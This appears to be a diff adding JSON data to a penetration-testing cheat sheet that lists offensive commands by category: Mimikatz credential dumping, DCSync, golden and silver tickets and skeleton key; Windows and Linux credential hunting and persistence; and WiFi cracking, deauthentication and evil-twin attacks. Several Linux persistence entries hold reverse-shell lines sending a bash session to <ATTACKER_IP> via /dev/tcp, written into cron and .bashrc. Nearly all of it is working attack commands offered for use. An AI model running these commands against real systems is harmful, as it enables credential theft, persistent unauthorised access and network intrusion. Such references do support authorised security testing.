+          { "title": "Reg.py Registry Query", "desc": "Remote registry queries", "cmd": "reg.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP> query -keyName 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'", "tags": ["tool"] }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "mimikatz",
+    "name": "Mimikatz Commands",
+    "icon": "🐱",
+    "description": "Mimikatz credential extraction, Kerberos ticket manipulation, and Windows credential attacks.",
+    "subcategories": [
+      {
+        "name": "Credential Extraction",
+        "commands": [
+          { "title": "Privilege Debug", "desc": "Elevate to debug privilege (required for most modules)", "cmd": "privilege::debug", "tags": ["essential"] },
+          { "title": "Sekurlsa LogonPasswords", "desc": "Dump cleartext passwords and NTLM hashes from LSASS", "cmd": "sekurlsa::logonpasswords", "tags": ["essential"] },
+          { "title": "Sekurlsa WDIGEST", "desc": "Show WDigest credentials (cleartext if enabled)", "cmd": "sekurlsa::wdigest", "tags": ["tool"] },
+          { "title": "Sekurlsa MSVCACHE", "desc": "Dump cached domain credentials", "cmd": "sekurlsa::msv", "tags": ["tool"] },
+          { "title": "Sekurlsa Kerberos Tickets", "desc": "List Kerberos tickets in memory", "cmd": "sekurlsa::kerberos", "tags": ["essential"] },
+          { "title": "Sekurlsa All Creds", "desc": "Dump all credential types at once", "cmd": "sekurlsa::logonpasswords full", "tags": ["essential"] },
+          { "title": "Sekurlsa DPAPI Keys", "desc": "Extract DPAPI master keys", "cmd": "sekurlsa::dpapi", "tags": ["advanced"] },
+          { "title": "Enable WDigest", "desc": "Force WDigest to cache cleartext creds", "cmd": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1", "tags": ["advanced"], "note": "Requires re-login to take effect" }
+        ]
+      },
+      {
+        "name": "SAM & LSA Dumps",
+        "commands": [
+          { "title": "LSADUMP SAM", "desc": "Dump local SAM hashes", "cmd": "lsadump::sam", "tags": ["essential"] },
+          { "title": "LSADUMP LSA Patch", "desc": "Dump LSA secrets using patch method", "cmd": "lsadump::lsa /patch", "tags": ["essential"] },
+          { "title": "LSADUMP DCSYNC", "desc": "DCSync attack — dump specific user hash", "cmd": "lsadump::dcsync /domain:<DOMAIN> /user:administrator", "tags": ["essential"] },
+          { "title": "LSADUMP DCSYNC All", "desc": "DCSync all domain hashes", "cmd": "lsadump::dcsync /domain:<DOMAIN> /all /csv", "tags": ["advanced"] },
+          { "title": "LSADUMP Secrets", "desc": "Dump LSA secrets (service account creds, DPAPI)", "cmd": "lsadump::secrets", "tags": ["essential"] },
+          { "title": "LSADUMP Cache", "desc": "Dump cached domain credentials", "cmd": "lsadump::cache", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "Kerberos Tickets",
+        "commands": [
+          { "title": "Kerberos List Tickets", "desc": "List all Kerberos tickets", "cmd": "kerberos::list /export", "tags": ["essential"] },
+          { "title": "Kerberos Pass-the-Ticket", "desc": "Inject a .kirbi ticket into session", "cmd": "kerberos::ptt <TICKET.kirbi>", "tags": ["essential"] },
+          { "title": "Kerberos Purge Tickets", "desc": "Remove all Kerberos tickets from memory", "cmd": "kerberos::purge", "tags": ["tool"] },
+          { "title": "Golden Ticket", "desc": "Create a golden ticket", "cmd": "kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt", "tags": ["advanced"] },
+          { "title": "Silver Ticket", "desc": "Create a silver ticket for a service", "cmd": "kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:<SERVICE> /rc4:<SERVICE_HASH> /ptt", "tags": ["advanced"] },
+          { "title": "Overpass-the-Hash", "desc": "Use NTLM hash to get a Kerberos TGT", "cmd": "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe", "tags": ["essential"] }
+        ]
+      },
+      {
+        "name": "Misc Mimikatz",
+        "commands": [
+          { "title": "Process Inject into LSASS", "desc": "Inject into LSASS process for credential access", "cmd": "privilege::debug\nsekurlsa::logonpasswords", "tags": ["essential"] },
+          { "title": "Vault Credentials", "desc": "Dump Windows Vault credentials", "cmd": "vault::cred /patch", "tags": ["tool"] },
+          { "title": "Vault List", "desc": "List Windows Vault entries", "cmd": "vault::list", "tags": ["tool"] },
+          { "title": "Crypto Export Certs", "desc": "Export all certificates from stores", "cmd": "crypto::certificates /export", "tags": ["advanced"] },
+          { "title": "Misc SkeltonKey", "desc": "Patch DC to allow skeleton key password", "cmd": "misc::skeleton", "tags": ["advanced"], "note": "Allows logging in with 'mimikatz' as any user's password — AD-wide" }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "post-exploitation-win",
+    "name": "Windows Post-Exploitation",
+    "icon": "🪟",
+    "description": "Windows post-exploitation — situational awareness, persistence, data gathering, and privilege escalation after initial foothold.",
+    "subcategories": [
+      {
+        "name": "Situational Awareness",
+        "commands": [
+          { "title": "Full System Info", "desc": "Get OS, hostname, and patch level", "cmd": "systeminfo", "tags": ["essential"] },
+          { "title": "Current User & Groups", "desc": "Show current user and group memberships", "cmd": "whoami /all", "tags": ["essential"] },
+          { "title": "Net Users", "desc": "List local users", "cmd": "net user", "tags": ["essential"] },
+          { "title": "Net Local Groups", "desc": "List local groups", "cmd": "net localgroup", "tags": ["essential"] },
+          { "title": "Local Admins", "desc": "List local administrator group members", "cmd": "net localgroup administrators", "tags": ["essential"] },
+          { "title": "Domain Users", "desc": "List domain users", "cmd": "net user /domain", "tags": ["essential"] },
+          { "title": "Domain Groups", "desc": "List domain groups", "cmd": "net group /domain", "tags": ["essential"] },
+          { "title": "Domain Controllers", "desc": "Find domain controllers", "cmd": "net group 'Domain Controllers' /domain", "tags": ["essential"] },
+          { "title": "Network Interfaces", "desc": "Show all network interfaces and IPs", "cmd": "ipconfig /all", "tags": ["essential"] },
+          { "title": "ARP Table", "desc": "Show ARP cache for host discovery", "cmd": "arp -a", "tags": ["essential"] },
+          { "title": "Routing Table", "desc": "Show routing table", "cmd": "route print", "tags": ["essential"] },
+          { "title": "Listening Ports", "desc": "Show all listening ports", "cmd": "netstat -ano | findstr LISTENING", "tags": ["essential"] },
+          { "title": "Active Connections", "desc": "Show all active connections", "cmd": "netstat -ano", "tags": ["essential"] },
+          { "title": "Running Processes", "desc": "List all running processes with PID", "cmd": "tasklist /v", "tags": ["essential"] },
+          { "title": "Processes with Network", "desc": "Match processes to network connections", "cmd": "netstat -ano | findstr :<PORT>", "tags": ["tool"] },
+          { "title": "Installed Software", "desc": "List installed programs", "cmd": "wmic product get name,version", "tags": ["essential"] },
+          { "title": "Installed Patches", "desc": "List installed Windows patches", "cmd": "wmic qfe get Caption,Description,HotFixID,InstalledOn", "tags": ["essential"] },
+          { "title": "Scheduled Tasks", "desc": "List all scheduled tasks", "cmd": "schtasks /query /fo LIST /v", "tags": ["essential"] },
+          { "title": "Services Running", "desc": "List running services", "cmd": "sc query type= all state= running", "tags": ["essential"] },
+          { "title": "PowerShell History", "desc": "Read PowerShell command history", "cmd": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt", "tags": ["essential"] },
+          { "title": "Environment Variables", "desc": "Show all environment variables", "cmd": "set", "tags": ["tool"] },
+          { "title": "Firewall Status", "desc": "Check Windows Firewall status", "cmd": "netsh advfirewall show allprofiles", "tags": ["tool"] },
+          { "title": "AV Installed", "desc": "Check installed antivirus via WMI", "cmd": "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname", "tags": ["essential"] }
+        ]
+      },
+      {
+        "name": "Credential Hunting",
+        "commands": [
+          { "title": "Search for Passwords in Files", "desc": "Search all files for password string", "cmd": "findstr /s /i /m \"password\" C:\\*.txt C:\\*.xml C:\\*.ini C:\\*.config", "tags": ["essential"] },
+          { "title": "Search Specific Extensions", "desc": "Find potentially sensitive files", "cmd": "dir /s /b *.txt *.xml *.config *.ini *.ps1 *.bat 2>nul", "tags": ["essential"] },
+          { "title": "Registry Passwords", "desc": "Search registry for password strings", "cmd": "reg query HKLM /f password /t REG_SZ /s", "tags": ["essential"] },
+          { "title": "Registry Passwords HKCU", "desc": "Search HKCU for passwords", "cmd": "reg query HKCU /f password /t REG_SZ /s", "tags": ["essential"] },
+          { "title": "Unattend Files", "desc": "Look for unattended installation files", "cmds": ["type C:\\Windows\\Panther\\Unattend.xml", "type C:\\Windows\\Panther\\Unattend\\Unattend.xml", "type C:\\Windows\\system32\\sysprep\\Unattend.xml"], "tags": ["essential"] },
+          { "title": "SAM & SYSTEM Files", "desc": "Copy SAM/SYSTEM for offline cracking", "cmds": ["reg save HKLM\\SAM C:\\Temp\\sam.hive", "reg save HKLM\\SYSTEM C:\\Temp\\system.hive"], "tags": ["essential"] },
+          { "title": "DPAPI Blob Hunt", "desc": "Find DPAPI blobs (credential files)", "cmd": "dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*", "tags": ["advanced"] },
+          { "title": "WiFi Passwords", "desc": "Dump saved WiFi passwords", "cmd": "for /f \"tokens=2 delims=:\" %i in ('netsh wlan show profiles ^| findstr Profile') do netsh wlan show profile name=%i key=clear", "tags": ["tool"] },
+          { "title": "PuTTY Saved Sessions", "desc": "Check PuTTY for saved credentials", "cmd": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s", "tags": ["tool"] },
+          { "title": "Chrome Credentials", "desc": "Find Chrome password database", "cmd": "dir /s /b \"%APPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\"", "tags": ["tool"] },
+          { "title": "IIS Web.config", "desc": "Look for credentials in IIS config", "cmds": ["type C:\\inetpub\\wwwroot\\web.config", "type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config"], "tags": ["essential"] }
+        ]
+      },
+      {
+        "name": "Windows Persistence",
+        "commands": [
+          { "title": "Registry Run Key (User)", "desc": "Add persistence via HKCU Run key", "cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v <NAME> /t REG_SZ /d 'C:\\Temp\\payload.exe'", "tags": ["essential"] },
+          { "title": "Registry Run Key (System)", "desc": "Add persistence via HKLM Run key (requires admin)", "cmd": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v <NAME> /t REG_SZ /d 'C:\\Temp\\payload.exe'", "tags": ["essential"] },
+          { "title": "Scheduled Task Persistence", "desc": "Create scheduled task for persistence", "cmd": "schtasks /create /tn <TASK_NAME> /tr C:\\Temp\\payload.exe /sc ONLOGON /ru SYSTEM", "tags": ["essential"] },
+          { "title": "New Service", "desc": "Create new Windows service for persistence", "cmds": ["sc create <SERVICE_NAME> binpath= 'C:\\Temp\\payload.exe' start= auto", "sc start <SERVICE_NAME>"], "tags": ["advanced"] },
+          { "title": "Startup Folder User", "desc": "Place payload in user startup folder", "cmd": "copy C:\\Temp\\payload.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", "tags": ["tool"] },
+          { "title": "Startup Folder Global", "desc": "Place payload in global startup folder (admin)", "cmd": "copy C:\\Temp\\payload.exe 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\'", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "Token & Impersonation",
+        "commands": [
+          { "title": "List Privileges (whoami)", "desc": "Check current token privileges", "cmd": "whoami /priv", "tags": ["essential"] },
+          { "title": "Incognito List Tokens", "desc": "List available impersonation tokens", "cmd": "list_tokens -u", "tags": ["tool"], "note": "Run in Meterpreter with load incognito" },
+          { "title": "Incognito Impersonate", "desc": "Impersonate a listed token", "cmd": "impersonate_token '<DOMAIN>\\<USER>'", "tags": ["tool"] },
+          { "title": "PrintSpoofer (SeImpersonate)", "desc": "Escalate via SeImpersonatePrivilege", "cmd": "PrintSpoofer.exe -i -c cmd.exe", "tags": ["essential"] },
+          { "title": "GodPotato (SeImpersonate)", "desc": "NT AUTHORITY\\SYSTEM via SeImpersonate", "cmd": "GodPotato.exe -cmd 'cmd.exe /c whoami > C:\\Temp\\out.txt'", "tags": ["essential"] },
+          { "title": "JuicyPotatoNG", "desc": "Token impersonation for SYSTEM", "cmd": "JuicyPotatoNG.exe -t * -p C:\\Temp\\payload.exe", "tags": ["tool"] },
+          { "title": "RunAs Different User", "desc": "Run process as different user", "cmd": "runas /user:<DOMAIN>\\<USER> cmd.exe", "tags": ["essential"] },
+          { "title": "RunAs with Saved Cred", "desc": "Run as user with saved credentials", "cmd": "runas /savecred /user:<DOMAIN>\\<USER> cmd.exe", "tags": ["tool"] }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "post-exploitation-linux",
+    "name": "Linux Post-Exploitation",
+    "icon": "🐧",
+    "description": "Linux post-exploitation — situational awareness, credential hunting, persistence, and lateral movement.",
+    "subcategories": [
+      {
+        "name": "Situational Awareness",
+        "commands": [
+          { "title": "Current User Info", "desc": "Show current user and all groups", "cmd": "id && whoami", "tags": ["essential"] },
+          { "title": "System Info", "desc": "OS version and kernel", "cmd": "uname -a && cat /etc/os-release", "tags": ["essential"] },
+          { "title": "All Users", "desc": "List all system users", "cmd": "cat /etc/passwd | grep -v nologin | grep -v false", "tags": ["essential"] },
+          { "title": "Sudo Rights", "desc": "Check sudo permissions", "cmd": "sudo -l", "tags": ["essential"] },
+          { "title": "Network Interfaces", "desc": "Show all network interfaces", "cmd": "ip a", "tags": ["essential"] },
+          { "title": "Routing Table", "desc": "Show routing table", "cmd": "ip route", "tags": ["essential"] },
+          { "title": "ARP Cache", "desc": "Show ARP table for host discovery", "cmd": "arp -a || ip neigh", "tags": ["essential"] },
+          { "title": "Listening Ports", "desc": "Show all listening ports", "cmd": "ss -tlnp", "tags": ["essential"] },
+          { "title": "All Connections", "desc": "Show all active network connections", "cmd": "ss -tulnp", "tags": ["essential"] },
+          { "title": "Running Processes", "desc": "List all processes with details", "cmd": "ps auxf", "tags": ["essential"] },
+          { "title": "Processes as Root", "desc": "Find processes running as root", "cmd": "ps aux | grep root", "tags": ["essential"] },
+          { "title": "Cron Jobs", "desc": "Check all cron job files", "cmds": ["crontab -l", "cat /etc/crontab", "ls /etc/cron*"], "tags": ["essential"] },
+          { "title": "Bash History", "desc": "Read command history", "cmd": "cat ~/.bash_history && cat ~/.zsh_history 2>/dev/null", "tags": ["essential"] },
+          { "title": "Recently Modified Files", "desc": "Find files modified in last 10 minutes", "cmd": "find / -mmin -10 -type f 2>/dev/null | grep -v proc", "tags": ["tool"] },
+          { "title": "Writable Directories", "desc": "Find world-writable directories", "cmd": "find / -writable -type d 2>/dev/null | grep -v proc", "tags": ["essential"] },
+          { "title": "Mounted Filesystems", "desc": "Show all mounted filesystems", "cmd": "mount | column -t", "tags": ["tool"] },
+          { "title": "SUID Files", "desc": "Find SUID binaries", "cmd": "find / -perm -u=s -type f 2>/dev/null", "tags": ["essential"] },
+          { "title": "SGID Files", "desc": "Find SGID binaries", "cmd": "find / -perm -g=s -type f 2>/dev/null", "tags": ["essential"] },
+          { "title": "Capabilities", "desc": "Find binaries with special capabilities", "cmd": "getcap -r / 2>/dev/null", "tags": ["essential"] }
+        ]
+      },
+      {
+        "name": "Credential Hunting",
+        "commands": [
+          { "title": "Search for Passwords", "desc": "Recursive search for password strings", "cmd": "grep -rni 'password\\|passwd\\|secret\\|credentials' /home /etc /var/www 2>/dev/null", "tags": ["essential"] },
+          { "title": "SSH Private Keys", "desc": "Find all SSH private keys", "cmd": "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null", "tags": ["essential"] },
+          { "title": "Config Files", "desc": "Find all .conf and .config files", "cmd": "find / -name '*.conf' -o -name '*.config' 2>/dev/null | grep -v proc", "tags": ["essential"] },
+          { "title": "Web App Configs", "desc": "Find web application config files", "cmd": "find /var/www /srv /opt -name '*.php' -o -name '*.conf' -o -name '*.env' 2>/dev/null | xargs grep -l 'password\\|passwd\\|DB_PASS' 2>/dev/null", "tags": ["essential"] },
+          { "title": "MySQL Credentials", "desc": "Find MySQL config with credentials", "cmd": "cat /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null; find / -name '.my.cnf' 2>/dev/null | xargs cat", "tags": ["tool"] },
+          { "title": "WordPress Config", "desc": "Find WordPress database credentials", "cmd": "find / -name 'wp-config.php' 2>/dev/null | xargs cat", "tags": ["tool"] },
+          { "title": "Shadow File", "desc": "Read /etc/shadow if accessible", "cmd": "cat /etc/shadow", "tags": ["essential"] },
+          { "title": "Stored SSH Keys", "desc": "Find authorized_keys files", "cmd": "find / -name 'authorized_keys' 2>/dev/null", "tags": ["tool"] },
+          { "title": "History Files", "desc": "Find all shell history files", "cmd": "find / -name '*.history' -o -name '.bash_history' -o -name '.zsh_history' 2>/dev/null | xargs cat", "tags": ["essential"] },
+          { "title": "Last Login", "desc": "Show last login info", "cmd": "last && lastlog", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "Linux Persistence",
+        "commands": [
+          { "title": "SSH Key Persistence", "desc": "Add SSH public key to authorized_keys", "cmd": "echo '<SSH_PUBLIC_KEY>' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys", "tags": ["essential"] },
+          { "title": "Cron Job Reverse Shell", "desc": "Add cron job for reverse shell persistence", "cmd": "(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1') | crontab -", "tags": ["essential"] },
+          { "title": "SUID Bash Copy", "desc": "Create SUID copy of bash for persistence", "cmds": ["cp /bin/bash /tmp/.bash", "chmod +s /tmp/.bash"], "tags": ["advanced"], "note": "Then: /tmp/.bash -p for root shell" },
+          { "title": ".bashrc Persistence", "desc": "Add payload to .bashrc for login persistence", "cmd": "echo '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> ~/.bashrc", "tags": ["tool"] },
+          { "title": "Systemd Service Persistence", "desc": "Create systemd service for persistence (root)", "cmds": ["echo '[Unit]\\nDescription=My Service\\n[Service]\\nExecStart=/tmp/payload.sh\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/my-service.service", "systemctl enable my-service", "systemctl start my-service"], "tags": ["advanced"] },
+          { "title": "LD_PRELOAD Persistence", "desc": "Inject shared library on program execution", "cmd": "echo '/tmp/evil.so' > /etc/ld.so.preload", "tags": ["advanced"] }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "wireless",
+    "name": "Wireless Security Testing",
+    "icon": "📡",
+    "description": "WiFi security testing — WPA/WPA2 cracking, WPS attacks, evil twin, and wireless reconnaissance.",
+    "subcategories": [
+      {
+        "name": "Wireless Reconnaissance",
+        "commands": [
+          { "title": "Enable Monitor Mode", "desc": "Put wireless interface into monitor mode", "cmd": "sudo airmon-ng start <INTERFACE>", "tags": ["essential"] },
+          { "title": "Kill Interfering Processes", "desc": "Kill processes that may interfere with monitor mode", "cmd": "sudo airmon-ng check kill", "tags": ["essential"] },
+          { "title": "Scan All Networks", "desc": "Scan and list all nearby WiFi networks", "cmd": "sudo airodump-ng <INTERFACE>mon", "tags": ["essential"] },
+          { "title": "Target Specific Network", "desc": "Capture packets from specific network", "cmd": "sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture <INTERFACE>mon", "tags": ["essential"] },
+          { "title": "Scan with Kismet", "desc": "Passive wireless scanner with more detail", "cmd": "sudo kismet -c <INTERFACE>", "tags": ["tool"] },
+          { "title": "Disable Monitor Mode", "desc": "Restore interface to managed mode", "cmd": "sudo airmon-ng stop <INTERFACE>mon && sudo service NetworkManager restart", "tags": ["essential"] }
+        ]
+      },
+      {
+        "name": "WPA/WPA2 Attacks",
+        "commands": [
+          { "title": "Capture WPA Handshake", "desc": "Capture 4-way handshake from client", "cmd": "sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w handshake <INTERFACE>mon", "tags": ["essential"] },
+          { "title": "Deauth to Force Handshake", "desc": "Force client to reconnect and capture handshake", "cmd": "sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon", "tags": ["essential"] },
+          { "title": "Crack WPA with Aircrack", "desc": "Crack captured WPA handshake", "cmd": "aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt", "tags": ["essential"] },
+          { "title": "Convert to Hashcat Format", "desc": "Convert .cap to hashcat format (22000)", "cmd": "hcxpcapngtool -o hash.hc22000 handshake.cap", "tags": ["tool"] },
+          { "title": "Crack WPA with Hashcat", "desc": "Crack WPA hash with hashcat", "cmd": "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule", "tags": ["essential"] },
+          { "title": "PMKID Attack", "desc": "Capture PMKID without waiting for handshake", "cmd": "sudo hcxdumptool -o capture.pcapng -i <INTERFACE>mon --enable_status=1", "tags": ["advanced"] },
+          { "title": "PMKID Extract Hash", "desc": "Extract PMKID hash from capture", "cmd": "hcxpcapngtool -o pmkid.hc22000 capture.pcapng", "tags": ["advanced"] }
+        ]
+      },
+      {
+        "name": "WPS & Other Attacks",
+        "commands": [
+          { "title": "WPS Scan", "desc": "Scan for WPS-enabled networks", "cmd": "sudo wash -i <INTERFACE>mon", "tags": ["essential"] },
+          { "title": "Reaver WPS PIN Attack", "desc": "Brute force WPS PIN", "cmd": "sudo reaver -i <INTERFACE>mon -b <BSSID> -vv", "tags": ["tool"] },
+          { "title": "Reaver with Delay", "desc": "WPS attack with delay to avoid lockout", "cmd": "sudo reaver -i <INTERFACE>mon -b <BSSID> -d 2 -r 3:15 -vv", "tags": ["tool"] },
+          { "title": "Pixie Dust Attack", "desc": "Offline WPS attack (pixie dust)", "cmd": "sudo reaver -i <INTERFACE>mon -b <BSSID> -K 1 -vv", "tags": ["advanced"] },
+          { "title": "Evil Twin (hostapd-wpe)", "desc": "Create rogue AP for credential capture", "cmd": "sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf", "tags": ["advanced"] },
+          { "title": "Evil Twin (airbase-ng)", "desc": "Create fake AP with airbase-ng", "cmd": "sudo airbase-ng -e '<SSID>' -c <CHANNEL> <INTERFACE>mon", "tags": ["advanced"] }
+        ]
+      }
+    ]
   }
 ];
